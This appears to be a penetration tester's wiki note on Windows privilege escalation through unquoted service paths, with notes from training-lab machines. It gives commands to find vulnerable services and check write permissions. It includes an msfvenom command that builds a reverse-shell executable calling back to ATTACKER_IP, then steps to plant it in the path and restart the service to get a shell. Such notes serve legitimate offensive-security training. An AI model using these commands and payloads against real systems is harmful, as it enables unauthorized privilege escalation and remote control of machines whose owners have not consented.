# Unquoted Service Paths

Back to [[Windows-PrivEsc-Methodology]]

## Find Unquoted Paths
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows" | findstr /i /v """
```

PowerUp:
```powershell
Get-UnquotedService
```

## How It Works

Path: `C:\Program Files\My Service\service.exe` (unquoted)

Windows tries in order:
1. `C:\Program.exe`
2. `C:\Program Files\My.exe`
3. `C:\Program Files\My Service\service.exe`

If you can write to any directory along the path before the real binary, you win.

## Exploit

Check write permissions:
```cmd
icacls "C:\Program Files\My Service"
```

If writable, generate payload on Kali:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe -o My.exe
```

Place and trigger:
```cmd
copy My.exe "C:\Program Files\My.exe"
sc stop servicename
sc start servicename
```

---

## From Your Boxes

> **Skylark Host 226** (Course) - DevService with unquoted path "C:\Skylark\Development Binaries 01\???????.exe"
> - What worked: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f exe -o Development.exe`, placed Development.exe in C:\Skylark\, restarted service
> - Lesson: Space in "Development Binaries 01" means Windows tries C:\Skylark\Development.exe first. Name your payload to match the truncated path.

> **React** (VHL) - Abyss Web Server X1 2.11.1 had an unquoted service path vulnerability
> - What worked: Identified via known exploit-db entry for unquoted service path privesc
> - Lesson: Search exploit-db for "[software name] unquoted service path" for known vulnerabilities in installed software.
